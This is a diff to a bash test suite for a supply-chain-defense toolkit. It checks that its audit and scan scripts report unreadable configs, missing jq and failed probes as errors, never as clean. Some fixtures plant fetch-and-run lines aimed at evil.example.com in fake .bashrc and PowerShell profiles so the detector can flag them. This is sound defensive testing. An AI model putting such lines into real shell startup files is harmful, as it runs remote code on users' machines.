@@ -9,8 +9,8 @@
 # Usage:   bash tests/run.sh
 # Exit:    0 all pass, 1 one or more failures
 #
-# Network-dependent checks (preinstall-check registry lookups) are intentionally
-# omitted here — run that script manually against live registries.
+# No live network: preinstall-check talks to a curl shim that serves a canned
+# registry document, and postinstall-audit --live goes through a dead proxy.
 
 set -uo pipefail
 
@@ -25,13 +25,10 @@ WGHOOK="$SKILL/../../hooks/worktree-guard.sh"   # not supply-chain, but its dete
 # either output channel. Which channel (additionalContext JSON vs stderr + exit 2)
 # is pinned by tests/hooks.sh, which the installed layout does not ship.
 SCAN="$SKILL/scripts/scan-extensions.sh"
-# Pick a python that actually executes — skips the Windows Store `python3` stub
-# (an app-execution alias that exits non-zero non-interactively).
-PYTHON=""
-for c in python python3 py; do
-  if command -v "$c" >/dev/null 2>&1 && "$c" -c "" >/dev/null 2>&1; then PYTHON="$c"; break; fi
-done
-[[ -z "$PYTHON" ]] && { echo "no working python found" >&2; exit 1; }
+# The skill's own launcher picks the interpreter (first of python3/python/py
+# that really runs 3.8+, skipping the Windows Store `python3` alias), so the
+# suite resolves Python exactly the way the docs tell an agent to.
+PYTHON="$(bash "$SCRIPTS/run-python.sh" --which)" || { echo "no Python 3.8+ found (scripts/run-python.sh --which)" >&2; exit 1; }
 SB="$(mktemp -d)"; trap 'rm -rf "$SB"' EXIT
 
 PASS=0; FAIL=0
@@ -42,6 +39,38 @@ expect_has()  { case "$3" in *"$2"*) ok "$1";; *) no "$1 (missing '$2')";; esac;
 expect_lacks() { case "$3" in *"$2"*) no "$1 (unexpected '$2')";; *) ok "$1";; esac; }
 
 echo "=== supply-chain-defense self-test ==="
+
+# ── run-python.sh (launcher: first of python3/python/py that is really 3.8+) ─
+# On Windows `python3` is often the Microsoft Store alias (prints a hint, exits
+# 49, runs nothing), and an old interpreter passes a bare "import sys" probe yet
+# can't run these scripts. Fake both on PATH ahead of a `py` that wraps the real
+# interpreter: the launcher must skip them and land on py.
+echo "-- run-python.sh --"
+RP="$SCRIPTS/run-python.sh"
+REAL_PY="$(command -v "$PYTHON")"
+FK="$SB/fakepy"; mkdir -p "$FK/skip" "$FK/first" "$FK/none"
+printf '#!/bin/sh\necho "Python was not found; run without arguments to install from the Microsoft Store" >&2\nexit 49\n' > "$FK/stub"
+# Pre-3.8 stand-in: answers "import sys" (as a real 3.7 would), fails the version
+# gate, and dies on anything else the way 3.7 dies on 3.8+ syntax.
+printf '#!/bin/sh\ncase "$*" in *version_info*) exit 1 ;; "-c import sys"*) exit 0 ;; esac\necho "SyntaxError: invalid syntax" >&2; exit 1\n' > "$FK/old"
+printf '#!/bin/sh\nexec "%s" "$@"\n' "$REAL_PY" > "$FK/real"
+chmod +x "$FK/stub" "$FK/old" "$FK/real"
+cp "$FK/stub" "$FK/skip/python3"; cp "$FK/old" "$FK/skip/python"; cp "$FK/real" "$FK/skip/py"
+for n in python3 python py; do cp "$FK/real" "$FK/first/$n"; done
+cp "$FK/stub" "$FK/none/python3"; cp "$FK/old" "$FK/none/python"; cp "$FK/stub" "$FK/none/py"
+bash "$RP" --help >/dev/null 2>&1; expect_exit "launcher --help" 0 $?
+bash "$RP" >/dev/null 2>&1;        expect_exit "launcher no args -> 2" 2 $?
+out="$(PATH="$FK/skip:$PATH" bash "$RP" --which 2>/dev/null)"
+[[ "$out" == "py" ]] && ok "skips Store-stub python3 + pre-3.8 python, picks py" || no "want py past the broken python3/python, got '$out'"
+out="$(PATH="$FK/first:$PATH" bash "$RP" --which 2>/dev/null)"
+[[ "$out" == "python3" ]] && ok "first working candidate wins (python3)" || no "want python3 first, got '$out'"
+out="$(PATH="$FK/skip:$PATH" bash "$RP" -c 'import sys; print(sys.version_info >= (3, 8))' 2>/dev/null)"
+expect_has "runs code through the picked interpreter" "True" "$out"
+PATH="$FK/skip:$PATH" bash "$RP" "$SCRIPTS/exposure-check.py" --help >/dev/null 2>&1
+expect_exit "runs a skill script past a broken python3" 0 $?
+err="$(PATH="$FK/none" "$BASH" "$RP" --which 2>&1 >/dev/null)"; rc=$?
+expect_exit "no usable python -> 5" 5 "$rc"
+expect_has "missing-dep hint names the version floor" "3.8" "$err"
 
 # ── exposure-check.py ──────────────────────────────────────────────────────
 echo "-- exposure-check.py --"
@@ -151,11 +180,160 @@ out="$(HOME="$SB/fakehome" bash "$SCRIPTS/integrity-audit.sh" "$SB/empty" 2>&1)"
 expect_exit "shell-rc persistence -> 10" 10 "$rc"
 expect_has  "flags shell_rc" "shell_rc" "$out"
 
+# A producer that dies must never read as clean. A loop fed by `< <(cmd)` never
+# sees cmd's exit status, and a jq that cannot parse a config printed nothing, so
+# both once came back "Clean". Each PATH shim breaks exactly one producer; the
+# scan must answer 5 (could not scan), not 0. Isolated HOME/APPDATA so the real
+# machine's configs never leak into the verdict.
+SHIM="$SB/shim"; mkdir -p "$SHIM/find" "$SHIM/grep-oidc" "$SB/iahome" "$SB/iaproj"
+# Windows find.exe ahead of GNU find on PATH answers like this.
+printf '#!/bin/sh\necho "FIND: Parameter format not correct" >&2\nexit 2\n' > "$SHIM/find/find"
+# Dies only on the workflow OIDC grep; every other grep runs for real.
+printf '#!/bin/sh\ncase "$*" in *id-token*) echo "grep: simulated read error" >&2; exit 2 ;; esac\nexec "%s" "$@"\n' \
+  "$(command -v grep)" > "$SHIM/grep-oidc/grep"
+chmod +x "$SHIM/find/find" "$SHIM/grep-oidc/grep"
+IA=(env HOME="$SB/iahome" APPDATA="$SB/iahome")
+out="$("${IA[@]}" bash "$SCRIPTS/integrity-audit.sh" "$SB/iaproj" 2>&1)"; rc=$?
+expect_exit "isolated empty audit -> 0 (baseline for the shims)" 0 "$rc"
+out="$("${IA[@]}" PATH="$SHIM/find:$PATH" bash "$SCRIPTS/integrity-audit.sh" "$SB/iaproj" 2>&1)"; rc=$?
+expect_exit "find dies -> 5, not clean" 5 "$rc"
+expect_has  "find dies: says project configs NOT scanned" "NOT scanned" "$out"
+out="$("${IA[@]}" PATH="$SHIM/find:$PATH" bash "$SCRIPTS/integrity-audit.sh" --json "$SB/iaproj" 2>/dev/null)"
+expect_has  "find dies: --json lists it in meta.unscanned" '"unscanned":["' "$(printf '%s' "$out" | jq -c '.meta')"
+mkdir -p "$SB/iaoidc/.github/workflows"
+printf 'permissions:\n  id-token: write\n' > "$SB/iaoidc/.github/workflows/x.yml"
+out="$("${IA[@]}" PATH="$SHIM/grep-oidc:$PATH" bash "$SCRIPTS/integrity-audit.sh" "$SB/iaoidc" 2>&1)"; rc=$?
+expect_exit "workflow grep dies -> 5, not clean" 5 "$rc"
+# Findings outrank an unscanned section: 10 is never a false clean, so it stays.
+mkdir -p "$SB/iarc"; printf 'curl http://evil.example.com/p | sh\n' > "$SB/iarc/.bashrc"
+out="$(env HOME="$SB/iarc" APPDATA="$SB/iarc" PATH="$SHIM/grep-oidc:$PATH" bash "$SCRIPTS/integrity-audit.sh" "$SB/iaoidc" 2>&1)"; rc=$?
+expect_exit "findings + unscanned section -> 10" 10 "$rc"
+expect_has  "findings + unscanned: still warns" "NOT scanned" "$out"
+# A settings.json jq cannot parse hides its hooks; it was silently skipped.
+mkdir -p "$SB/iabad/.claude"; printf '{"hooks": {' > "$SB/iabad/.claude/settings.json"
+out="$(env HOME="$SB/iabad" APPDATA="$SB/iabad" bash "$SCRIPTS/integrity-audit.sh" "$SB/iaproj" 2>&1)"; rc=$?
+expect_exit "unparseable settings.json -> 5, not clean" 5 "$rc"
+expect_has  "unparseable settings.json: named" ".claude/settings.json" "$out"
+# No jq at all: hooks/mcpServers were never read. Only provable where jq is not
+# beside bash in /usr/bin (a Linux runner ships /usr/bin/jq).
+if ! PATH="/usr/bin:/bin" command -v jq >/dev/null 2>&1; then
+  mkdir -p "$SB/iajq/.claude"; printf '{"hooks":{"PreToolUse":[]}}' > "$SB/iajq/.claude/settings.json"
+  out="$(env HOME="$SB/iajq" APPDATA="$SB/iajq" PATH="/usr/bin:/bin" bash "$SCRIPTS/integrity-audit.sh" "$SB/iaproj" 2>&1)"; rc=$?
+  expect_exit "jq missing with a settings.json -> 5, not clean" 5 "$rc"
+else
+  echo "  SKIP  integrity-audit jq-missing case (jq lives in /usr/bin here)"
+fi
+# Windows PowerShell 5.1's `>` and Out-File write UTF-16LE. An ASCII regex never
+# matches UTF-16 text and GNU grep reads its NULs as binary, so a planted
+# download-and-run line in such a profile once read clean.
+PSP="Documents/WindowsPowerShell/Microsoft.PowerShell_profile.ps1"
+u16() {  # u16 <utf8-src> <dst> [nobom] - write src as UTF-16LE, BOM first unless nobom
+  "$PYTHON" -c 'import sys; b = open(sys.argv[1], "rb").read().decode("utf-8").encode("utf-16-le"); open(sys.argv[2], "wb").write(b if sys.argv[3:] == ["nobom"] else b"\xff\xfe" + b)' "$@"
+}
+printf 'Set-Alias ll Get-ChildItem\r\nInvoke-Expression (New-Object Net.WebClient).DownloadString("http://evil.example.com/p.ps1")\r\n' > "$SB/ps-ioc.txt"
+printf 'Set-Alias ll Get-ChildItem\r\nImport-Module posh-git\r\n' > "$SB/ps-clean.txt"
+for d in iaps16 iapsclean iapsnobom; do mkdir -p "$SB/$d/$(dirname "$PSP")"; done
+u16 "$SB/ps-ioc.txt" "$SB/iaps16/$PSP"
+u16 "$SB/ps-clean.txt" "$SB/iapsclean/$PSP"
+u16 "$SB/ps-ioc.txt" "$SB/iapsnobom/$PSP" nobom
+if command -v iconv >/dev/null 2>&1; then
+  out="$(env HOME="$SB/iaps16" APPDATA="$SB/iaps16" bash "$SCRIPTS/integrity-audit.sh" "$SB/iaproj" 2>&1)"; rc=$?
+  expect_exit "UTF-16LE PowerShell profile with a download-and-run line -> 10" 10 "$rc"
+  expect_has  "UTF-16LE profile: the line is shown decoded" "DownloadString" "$out"
+  out="$(env HOME="$SB/iapsclean" APPDATA="$SB/iapsclean" bash "$SCRIPTS/integrity-audit.sh" "$SB/iaproj" 2>&1)"; rc=$?
+  expect_exit "clean UTF-16LE profile -> 0 (decoded and read, not skipped)" 0 "$rc"
+else
+  echo "  SKIP  integrity-audit UTF-16 decode cases (no iconv here)"
+fi
+mkdir -p "$SHIM/iconv" "$SHIM/grep-npmrc" "$SB/ianpm"
+printf '#!/bin/sh\necho "iconv: conversion from UTF-16 unsupported" >&2\nexit 1\n' > "$SHIM/iconv/iconv"
+printf '#!/bin/sh\ncase "$*" in *_authToken*) echo "grep: simulated read error" >&2; exit 2 ;; esac\nexec "%s" "$@"\n' \
+  "$(command -v grep)" > "$SHIM/grep-npmrc/grep"
+chmod +x "$SHIM/iconv/iconv" "$SHIM/grep-npmrc/grep"
+out="$(env HOME="$SB/iaps16" APPDATA="$SB/iaps16" PATH="$SHIM/iconv:$PATH" bash "$SCRIPTS/integrity-audit.sh" "$SB/iaproj" 2>&1)"; rc=$?
+expect_exit "UTF-16 profile iconv cannot decode -> 5, not clean" 5 "$rc"
+expect_has  "UTF-16 profile iconv cannot decode: named NOT scanned" "NOT scanned" "$out"
+out="$(env HOME="$SB/iapsnobom" APPDATA="$SB/iapsnobom" bash "$SCRIPTS/integrity-audit.sh" "$SB/iaproj" 2>&1)"; rc=$?
+expect_exit "UTF-16 profile without a BOM (encoding unknown) -> 5, not clean" 5 "$rc"
+# grep exit 2 is a read error, not "no match": it once read as a clean .npmrc.
+printf 'registry=https://registry.npmjs.org/\n' > "$SB/ianpm/.npmrc"
+out="$(env HOME="$SB/ianpm" APPDATA="$SB/ianpm" PATH="$SHIM/grep-npmrc:$PATH" bash "$SCRIPTS/integrity-audit.sh" "$SB/iaproj" 2>&1)"; rc=$?
+expect_exit "config grep dies (exit 2) -> 5, not clean" 5 "$rc"
+# grep 3.5+ (Ubuntu's, not Git Bash's 3.0) announces a match in a file holding a
+# NUL byte on stderr only: stdout empty, exit 0. One stray NUL hid every hit.
+mkdir -p "$SHIM/grep35" "$SB/ianul"
+cat > "$SHIM/grep35/grep" <<SH
+#!/bin/sh
+text=0; last=
+for a in "\$@"; do case "\$a" in --text) text=1 ;; --*) ;; -*a*) text=1 ;; esac; last=\$a; done
+if [ "\$text" = 0 ] && [ -f "\$last" ] && [ "\$(tr -d '\\000' < "\$last" | wc -c)" != "\$(wc -c < "\$last")" ]; then
+  "$(command -v grep)" -q "\$@" 2>/dev/null; rc=\$?
+  [ "\$rc" = 0 ] && echo "grep: \$last: binary file matches" >&2
+  exit "\$rc"
+fi
+exec "$(command -v grep)" "\$@"
+SH
+chmod +x "$SHIM/grep35/grep"
+printf 'export X=1\000\ncurl http://evil.example.com/p | sh\n' > "$SB/ianul/.bashrc"
+out="$(env HOME="$SB/ianul" APPDATA="$SB/ianul" PATH="$SHIM/grep35:$PATH" bash "$SCRIPTS/integrity-audit.sh" "$SB/iaproj" 2>&1)"; rc=$?
+expect_exit "IOC in a .bashrc holding a stray NUL (grep 3.5+) -> 10" 10 "$rc"
+
 # ── preinstall-check.sh (offline bits only) ────────────────────────────────
 echo "-- preinstall-check.sh --"
 bash "$SCRIPTS/preinstall-check.sh" --help >/dev/null 2>&1; expect_exit "--help" 0 $?
 bash "$SCRIPTS/preinstall-check.sh" --bogus >/dev/null 2>&1; expect_exit "bad flag -> 2" 2 $?
 bash "$SCRIPTS/preinstall-check.sh" >/dev/null 2>&1;        expect_exit "no args -> 2" 2 $?
+
+# Registry faked offline: a curl shim logs each URL it is asked for and answers
+# with one canned npm document - 1.2.3 is years old, 2.0.0 was published today
+# (inside any cooldown). Builtins only, so it also runs on the jq-less PATH below.
+REG="$SB/reg"; mkdir -p "$REG"
+NOW_ISO="$(date -u +%Y-%m-%dT%H:%M:%SZ)"
+PACKUMENT="{\"dist-tags\":{\"latest\":\"2.0.0\"},\"time\":{\"1.2.3\":\"2020-01-01T00:00:00.000Z\",\"2.0.0\":\"$NOW_ISO\"}}"
+printf '#!/bin/sh\nfor a in "$@"; do u="$a"; done\nprintf "%%s\\n" "$u" >> "%s/urls.log"\nprintf "%%s" '"'"'%s'"'"'\n' \
+  "$REG" "$PACKUMENT" > "$REG/curl"
+chmod +x "$REG/curl"
+# `${spec%@*}` emptied a scoped name (`@scope/pkg` -> ""), so the registry was
+# queried with no package in the URL at all.
+: > "$REG/urls.log"
+out="$(PATH="$REG:$PATH" bash "$SCRIPTS/preinstall-check.sh" -q @scope/pkg 2>/dev/null)"; rc=$?
+case "$(cat "$REG/urls.log")" in
+  *"registry.npmjs.org/@scope"*pkg*) ok "scoped name reaches the registry URL" ;;
+  *) no "scoped name reaches the registry URL (asked for: $(cat "$REG/urls.log"))" ;;
+esac
+expect_has  "scoped name kept in the record" $'\t@scope/pkg\t2.0.0\t' "$out"
+expect_exit "scoped latest published today -> 10" 10 "$rc"
+# The `!= @*/*` guard dropped the version of `@scope/pkg@1.2.3`, so `latest` was
+# checked instead of the version asked for.
+out="$(PATH="$REG:$PATH" bash "$SCRIPTS/preinstall-check.sh" -q @scope/pkg@1.2.3 2>/dev/null)"; rc=$?
+expect_has  "scoped pinned version is the one checked" $'\t@scope/pkg\t1.2.3\t' "$out"
+expect_exit "scoped pinned old version -> 0" 0 "$rc"
+# The new splitter must leave unscoped specs as they were.
+out="$(PATH="$REG:$PATH" bash "$SCRIPTS/preinstall-check.sh" -q lodash@1.2.3 lodash 2>/dev/null)"
+expect_has  "unscoped pinned version kept" $'\tlodash\t1.2.3\t' "$out"
+expect_has  "unscoped bare name checks latest" $'\tlodash\t2.0.0\t' "$out"
+# A registry answer that has no publish time for the version asked for left the
+# age unknown, and an unknown age exited 0: unchecked read as clean.
+PATH="$REG:$PATH" bash "$SCRIPTS/preinstall-check.sh" -q left-pad@9.9.9 >/dev/null 2>&1
+expect_exit "unknown publish age is not a pass -> 7" 7 $?
+# --json built each record with select(), which empties the whole object when a
+# field is blank, so an unchecked package vanished from the output entirely.
+out="$(PATH="$REG:$PATH" bash "$SCRIPTS/preinstall-check.sh" -q --json left-pad@9.9.9 2>/dev/null)"
+expect_has  "--json keeps the unchecked package" '"unchecked_reason": "registry has no publish time' "$out"
+expect_has  "--json meta counts it" '"unchecked": 1' "$out"
+# Without jq every successful registry answer was thrown away: no version, no
+# time, cooldown never tested, exit 0 - a package published today walked through.
+# PATH holds only the shim and wrappers for the coreutils the script calls.
+NOJQ="$SB/nojq"; mkdir -p "$NOJQ"; cp "$REG/curl" "$NOJQ/curl"
+for t in date dirname; do printf '#!/bin/sh\nexec "%s" "$@"\n' "$(command -v "$t")" > "$NOJQ/$t"; done
+chmod +x "$NOJQ"/*
+(PATH="$NOJQ"; command -v jq >/dev/null 2>&1) && no "jq-less PATH still resolves jq (cases below are void)" \
+  || ok "jq-less PATH resolves no jq"
+for eco in npm pip composer cargo go; do
+  err="$(PATH="$NOJQ" "$BASH" "$SCRIPTS/preinstall-check.sh" -q "--$eco" newpkg 2>&1 >/dev/null)"; rc=$?
+  expect_exit "--$eco without jq -> 5, never a pass" 5 "$rc"
+  expect_has  "--$eco without jq names jq" "jq" "$err"
+done
 
 # ── pre-install-scan.sh hook (both input modes) ────────────────────────────
 echo "-- pre-install-scan.sh hook --"
@@ -280,11 +458,72 @@ mkdir -p "$SB/exts/pub.tool-1.0.0"
 printf '{"publisher":"pub","name":"tool","version":"1.0.0"}' > "$SB/exts/pub.tool-1.0.0/package.json"
 SC_EXT_DIRS="$SB/exts" bash "$SCAN" -q >/dev/null 2>&1; expect_exit "inventory (zero-dep) -> 0" 0 $?
 # --deep without engine: skips behavioural gracefully (exit 0) + LOUD recommendation,
-# never a false-clean. Lean default keeps guarddog/semgrep off the machine.
-out="$(PATH="/usr/bin:/bin" bash "$SCAN" --deep 2>&1)"; rc=$?
+# never a false-clean. Lean default keeps guarddog/semgrep off the machine. Empty
+# HOME and extension dirs: this PATH may lack jq, and with something to inventory
+# that is an honest 5 (below), not the case under test.
+mkdir -p "$SB/sxempty" "$SB/sxnone"
+out="$(HOME="$SB/sxempty" SC_EXT_DIRS="$SB/sxnone" PATH="/usr/bin:/bin" bash "$SCAN" --deep 2>&1)"; rc=$?
 expect_exit "--deep w/o engine skips (not fail) -> 0" 0 "$rc"
 expect_has  "skip notice recommends install" "uv tool install guarddog semgrep" "$out"
 expect_has  "skip notice is loud (not a clean verdict)" "SKIPPED" "$out"
+# An inventory it could not read is not "inventory done". The plugin list came
+# from a loop fed by `< <(jq ...)`, so a jq that choked on the file printed no
+# rows and the run still closed 0.
+mkdir -p "$SB/sxbad/.claude/plugins" "$SB/sxgood/.claude/plugins"
+printf '{"plugins": {' > "$SB/sxbad/.claude/plugins/installed_plugins.json"
+out="$(HOME="$SB/sxbad" SC_EXT_DIRS="$SB/sxnone" bash "$SCAN" 2>&1)"; rc=$?
+expect_exit "unparseable installed_plugins.json -> 5, not 0" 5 "$rc"
+expect_has  "unparseable plugins: says NOT read" "NOT read" "$out"
+printf '{"plugins":{"p@m":[{"gitCommitSha":"0123456789abcdef","scope":"user","lastUpdated":"2026-01-01"}]}}' \
+  > "$SB/sxgood/.claude/plugins/installed_plugins.json"
+out="$(HOME="$SB/sxgood" SC_EXT_DIRS="$SB/sxnone" bash "$SCAN" 2>&1)"; rc=$?
+expect_exit "valid installed_plugins.json -> 0" 0 "$rc"
+expect_has  "valid plugins: lists the pinned sha" "sha=0123456789ab" "$out"
+# --json stdout must be the document alone: a recently changed skill once printed
+# its "(recently changed)" row ahead of it, so `--json | jq` failed to parse.
+mkdir -p "$SB/sxgood/.claude/skills/fresh-ops"; : > "$SB/sxgood/.claude/skills/fresh-ops/run.sh"
+out="$(HOME="$SB/sxgood" SC_EXT_DIRS="$SB/sxnone" bash "$SCAN" --json 2>/dev/null)"
+printf '%s' "$out" | jq -e '.meta.unscanned == []' >/dev/null 2>&1
+expect_exit "--json with a recent skill: stdout parses, meta.unscanned empty" 0 $?
+# No jq: every extension's package.json went unread and was skipped as nameless.
+if ! PATH="/usr/bin:/bin" command -v jq >/dev/null 2>&1; then
+  out="$(HOME="$SB/sxempty" SC_EXT_DIRS="$SB/exts" PATH="/usr/bin:/bin" bash "$SCAN" 2>&1)"; rc=$?
+  expect_exit "jq missing with an extension installed -> 5, not 0" 5 "$rc"
+else
+  echo "  SKIP  scan-extensions jq-missing case (jq lives in /usr/bin here)"
+fi
+# Recency must work on BSD/macOS find, which rejects GNU's -printf. That error
+# was discarded, every item read recent=no, and --deep (gated to recent items)
+# behaviourally scanned nothing, then exited 0.
+SXS="$SB/sxshim"; mkdir -p "$SXS/bsdfind" "$SXS/engine"
+printf '#!/bin/sh\nfor a in "$@"; do [ "$a" = -printf ] && { echo "find: -printf: unknown primary or operator" >&2; exit 1; }; done\nexec "%s" "$@"\n' \
+  "$(command -v find)" > "$SXS/bsdfind/find"
+# A stand-in engine that flags whatever it is pointed at, so a finding proves the
+# extension was scanned at all.
+printf '#!/bin/sh\necho "Found 1 potentially malicious indicator"\nexit 1\n' > "$SXS/engine/guarddog"
+printf '#!/bin/sh\necho 1.99.0\n' > "$SXS/engine/semgrep"
+chmod +x "$SXS/bsdfind/find" "$SXS/engine/guarddog" "$SXS/engine/semgrep"
+mkdir -p "$SB/sxfresh/pub.fresh-1.0.0" "$SB/sxold/pub.old-1.0.0"
+printf '{"publisher":"pub","name":"fresh","version":"1.0.0"}' > "$SB/sxfresh/pub.fresh-1.0.0/package.json"
+printf '{"publisher":"pub","name":"old","version":"1.0.0"}' > "$SB/sxold/pub.old-1.0.0/package.json"
+: > "$SB/sxfresh/pub.fresh-1.0.0/extension.js"; : > "$SB/sxold/pub.old-1.0.0/extension.js"
+touch -t 202001010000 "$SB/sxold/pub.old-1.0.0/package.json" "$SB/sxold/pub.old-1.0.0/extension.js"
+out="$(HOME="$SB/sxgood" SC_EXT_DIRS="$SB/sxfresh:$SB/sxold" PATH="$SXS/bsdfind:$PATH" bash "$SCAN" 2>&1)"; rc=$?
+expect_exit "BSD find: inventory -> 0" 0 "$rc"
+expect_has  "BSD find: fresh extension reads recent=yes" $'pub.fresh\t1.0.0\trecent=yes' "$out"
+expect_has  "BSD find: old extension still reads recent=no" $'pub.old\t1.0.0\trecent=no' "$out"
+expect_has  "BSD find: fresh skill listed as recently changed" $'fresh-ops\t(recently changed)' "$out"
+out="$(HOME="$SB/sxempty" SC_EXT_DIRS="$SB/sxfresh" PATH="$SXS/bsdfind:$SXS/engine:$PATH" bash "$SCAN" --deep 2>&1)"; rc=$?
+expect_exit "BSD find: --deep behaviourally scans the fresh extension -> 10" 10 "$rc"
+# A recency probe that fails is unknown, not "no": the inventory was not read.
+out="$(HOME="$SB/sxempty" SC_EXT_DIRS="$SB/sxfresh" PATH="$SHIM/find:$PATH" bash "$SCAN" 2>&1)"; rc=$?
+expect_exit "find dies: recency unknown -> 5, not 0" 5 "$rc"
+expect_has  "find dies: row says recent=unknown" "recent=unknown" "$out"
+out="$(HOME="$SB/sxempty" SC_EXT_DIRS="$SB/sxfresh" PATH="$SHIM/find:$PATH" bash "$SCAN" --json 2>/dev/null)"
+printf '%s' "$out" | jq -e '(.data.inventory[0].recent == null) and (.meta.unscanned | length == 1)' >/dev/null 2>&1
+expect_exit "find dies: --json says recent null + one unscanned entry" 0 $?
+out="$(HOME="$SB/sxempty" SC_EXT_DIRS="$SB/sxfresh" PATH="$SHIM/find:$SXS/engine:$PATH" bash "$SCAN" --deep 2>&1)"; rc=$?
+expect_exit "find dies: --deep still scans the unknown-recency extension -> 10" 10 "$rc"
 # --deep behavioural finding — only when the engine is actually present
 if command -v guarddog >/dev/null 2>&1 && semgrep --version >/dev/null 2>&1; then
   mkdir -p "$SB/evil/bad.x-1.0.0"
@@ -336,14 +575,62 @@ JSONF
   out="$(pwsh -NoProfile -File "$PHMW" -InputJson "$EVIL_W" -Json 2>/dev/null)"; rc=$?
   expect_exit "evil replay --json -> 10" 10 "$rc"
   expect_has  "json envelope has schema" "phone-home-monitor/v1" "$out"
-  # -Sysmon contract: exit 5 with install hint when Sysmon absent (skip if installed)
-  if pwsh -NoProfile -Command 'try { $null = Get-WinEvent -ListLog "Microsoft-Windows-Sysmon/Operational" -ErrorAction Stop; exit 0 } catch { exit 1 }' >/dev/null 2>&1; then
+  # -Sysmon contract: exit 5 with install hint when Sysmon absent (skip if installed).
+  # Only NoMatchingLogsFound means absent: a non-elevated -ListLog of an installed
+  # but restricted channel fails too, and that case gets an elevation hint instead.
+  if pwsh -NoProfile -Command 'try { $null = Get-WinEvent -ListLog "Microsoft-Windows-Sysmon/Operational" -ErrorAction Stop; exit 0 } catch { if ($_.FullyQualifiedErrorId -like "NoMatchingLogsFound*") { exit 1 } else { exit 0 } }' >/dev/null 2>&1; then
     echo "  SKIP  -Sysmon missing-dep check (Sysmon is installed here)"
   else
     out="$(pwsh -NoProfile -File "$PHMW" -Sysmon 2>&1)"; rc=$?
     expect_exit "-Sysmon w/o Sysmon -> 5" 5 "$rc"
     expect_has  "hint names SwiftOnSecurity config" "SwiftOnSecurity" "$out"
   fi
+  # Both live reads ran with -ErrorAction SilentlyContinue, so a failed collection
+  # came back empty and exited 0: "no connections" and "could not look" were the
+  # same answer. The harness shadows the real cmdlets with global functions that
+  # fail the way Windows does, then runs the unmodified script.
+  cat > "$SB/phm-harness.ps1" <<'PS1'
+param([string]$Target, [string]$Fault, [switch]$Sysmon)
+$notFound = 'NoMatchingEventsFound,Microsoft.PowerShell.Commands.GetWinEventCommand'
+switch ($Fault) {
+  'tcp-fail' {   # CIM provider down: the TCP table was never read
+    function global:Get-NetTCPConnection { [CmdletBinding()] param([string[]]$State)
+      Write-Error -Message 'The RPC server is unavailable.' -Category ResourceUnavailable -ErrorId 'HRESULT 0x800706ba,Get-NetTCPConnection' } }
+  'tcp-none' {   # idle machine: CDXML reports "nothing in this state" as ObjectNotFound
+    function global:Get-NetTCPConnection { [CmdletBinding()] param([string[]]$State)
+      Write-Error -Message 'No matching MSFT_NetTCPConnection objects found' -Category ObjectNotFound -ErrorId 'CmdletizationQuery_NotFound_State,Get-NetTCPConnection' } }
+  'tcp-partial' {   # Established has a connection, SynSent has none: data AND a no-match error
+    function global:Get-NetTCPConnection { [CmdletBinding()] param([string[]]$State)
+      [pscustomobject]@{ RemoteAddress = '203.0.113.7'; RemotePort = 443; OwningProcess = 0 }
+      Write-Error -Message 'No matching MSFT_NetTCPConnection objects found' -Category ObjectNotFound -ErrorId 'CmdletizationQuery_NotFound_State,Get-NetTCPConnection' } }
+  'sysmon-denied' {   # installed, unreadable from this session
+    function global:Get-WinEvent { [CmdletBinding()] param([string]$ListLog, [string]$LogName, [string]$FilterXPath, [hashtable]$FilterHashtable, [int]$MaxEvents)
+      if ($ListLog) { return [pscustomobject]@{ LogName = $ListLog } }
+      # Windows answers an unreadable log queried by -FilterHashtable with "no events"
+      if ($FilterHashtable) { Write-Error -Message 'No events were found that match the specified selection criteria.' -Category ObjectNotFound -ErrorId $notFound; return }
+      Write-Error -Exception ([System.UnauthorizedAccessException]::new('Attempted to perform an unauthorized operation.')) -Category NotSpecified -ErrorId 'System.UnauthorizedAccessException,Microsoft.PowerShell.Commands.GetWinEventCommand' } }
+  'sysmon-empty' {   # readable, genuinely no EID 3 events yet
+    function global:Get-WinEvent { [CmdletBinding()] param([string]$ListLog, [string]$LogName, [string]$FilterXPath, [hashtable]$FilterHashtable, [int]$MaxEvents)
+      if ($ListLog) { return [pscustomobject]@{ LogName = $ListLog } }
+      Write-Error -Message 'No events were found that match the specified selection criteria.' -Category ObjectNotFound -ErrorId $notFound } }
+}
+if ($Sysmon) { & $Target -Sysmon } else { & $Target }
+exit $LASTEXITCODE
+PS1
+  PHH="$SB/phm-harness.ps1"; command -v cygpath >/dev/null 2>&1 && PHH="$(cygpath -w "$PHH")"
+  err="$(pwsh -NoProfile -File "$PHH" -Target "$PHMW" -Fault tcp-fail 2>&1 >/dev/null)"; rc=$?
+  expect_exit "TCP table unreadable -> 7, not clean" 7 "$rc"
+  expect_has  "names the source it could not read" "tcp-table" "$err"
+  pwsh -NoProfile -File "$PHH" -Target "$PHMW" -Fault tcp-none >/dev/null 2>&1
+  expect_exit "no connections in a state is still clean -> 0" 0 $?
+  err="$(pwsh -NoProfile -File "$PHH" -Target "$PHMW" -Fault tcp-partial 2>&1 >/dev/null)"; rc=$?
+  expect_exit "a no-match for one state keeps the other state's connections -> 0" 0 "$rc"
+  expect_has  "partial read still counts its connection" "1 outbound connection(s) examined" "$err"
+  err="$(pwsh -NoProfile -File "$PHH" -Target "$PHMW" -Fault sysmon-denied -Sysmon 2>&1 >/dev/null)"; rc=$?
+  expect_exit "Sysmon log unreadable -> 5, not clean" 5 "$rc"
+  expect_has  "unreadable Sysmon log asks for elevation" "elevated" "$err"
+  pwsh -NoProfile -File "$PHH" -Target "$PHMW" -Fault sysmon-empty -Sysmon >/dev/null 2>&1
+  expect_exit "readable Sysmon log with no events is clean -> 0" 0 $?
 else
   echo "  SKIP  phone-home-monitor.ps1 needs pwsh on Windows (Sysmon/Event-Log tool)"
 fi
@@ -398,6 +685,93 @@ CACHE="$SB/pa-cache.json"
 err="$("$PYTHON" "$PA" --root "$SB/pa-clean" --cache "$CACHE" 2>&1 >/dev/null)"
 expect_has  "second run hits cache" "cache hits" "$err"
 
+# --live checks only packages already flagged, and the findings branch exited 10
+# before the registry outage was looked at, so the documented exit 7 could never
+# fire and an unrun takedown check was invisible. Findings stay 10; the outage
+# must show in the JSON envelope and on stderr. A dead proxy fails every request.
+env HTTPS_PROXY=http://127.0.0.1:9 https_proxy=http://127.0.0.1:9 NO_PROXY= no_proxy= \
+  "$PYTHON" "$PA" --root "$SB/pa" --no-cache --live --json >"$SB/pa-live.json" 2>"$SB/pa-live.err"
+expect_exit "--live, registry down, findings kept -> 10" 10 $?
+expect_has  "--live outage in JSON meta" '"live": "unavailable"' "$(cat "$SB/pa-live.json")"
